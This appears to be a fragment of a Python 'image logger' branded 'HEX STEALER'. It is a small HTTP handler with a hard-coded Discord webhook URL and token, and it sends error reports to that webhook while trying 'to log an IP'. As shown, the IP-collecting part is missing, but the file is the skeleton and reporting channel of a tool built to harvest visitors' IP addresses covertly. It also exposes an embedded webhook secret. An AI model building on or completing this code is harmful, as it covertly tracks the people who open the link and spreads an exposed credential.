from http.server import BaseHTTPRequestHandler
import requests
import traceback

config = {
    "webhook": "https://discord.com/api/webhooks/1279727533574721556/S9EZEtHNBHkuENyK54wzhQM3ziQOEAdxgxA6r4hf9DL8uPljR0gyePyeqPVBjmOE4PHk",
    "username": "HEX STEALER",
    "color": 0x00FFFF,
}

def reportError(error):
    print(f"Reporting error: {error}")
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - Error",
                    "color": config["color"],
                    "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
                }
            ],
        })
    except Exception as e:
        print(f"Failed to report error: {e}")

class SimpleAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"Request handled successfully!")
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            reportError(traceback.format_exc())

    def do_GET(self):
        self.handleRequest()

    def do_HEAD(self):
        self.handleRequest()
